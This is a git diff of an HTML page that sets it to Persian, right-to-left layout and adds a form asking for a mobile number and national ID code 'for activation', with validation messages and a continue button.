@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa" dir="rtl">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -13,6 +13,43 @@
     />
   </head>
   <body>
+    <!-- page 1 -->
+    <div
+      class="bg-black/90 flex items-center flex-col justify-center h-[100dvh]"
+    >
+      <h1 class="text-white">
+        برای فعال سازی اطالاعات خواسته شده را وارد نمایید.
+      </h1>
+      <div class="mt-5 flex gap-1 flex-col">
+        <input
+          class="p-1.5 w-[15rem] rounded-lg outline-none text-black"
+          type="number"
+          placeholder="شماره موبایل"
+          id="phoneInput"
+        />
+        <span id="phoneValid" class="text-sm hidden text-red-600"
+          >شماره موبایل وارد شده صحیح نیست.</span
+        >
+      </div>
+      <div class="mt-5 flex gap-1 flex-col">
+        <input
+          class="p-1.5 w-[15rem] rounded-lg outline-none text-black"
+          type="number"
+          placeholder="کد ملی"
+          id="codemeliInput"
+        />
+        <span id="codeValid" class="text-sm hidden text-red-600"
+          >کدملی وارد شده صحیح نیست.</span
+        >
+      </div>
+      <button
+        id="firstBtn"
+        class="p-2 rounded-lg bg-indigo-700 text-white w-[15rem] mt-8 hover:bg-indigo-950 border border-[rgba(255,255,255,0.3)] transition-all duration-300"
+      >
+        ادامه
+      </button>
+    </div>
+    <!-- end page 1 -->
     <script src="./src/js/index.js"></script>
     <script
       type="text/javascript"
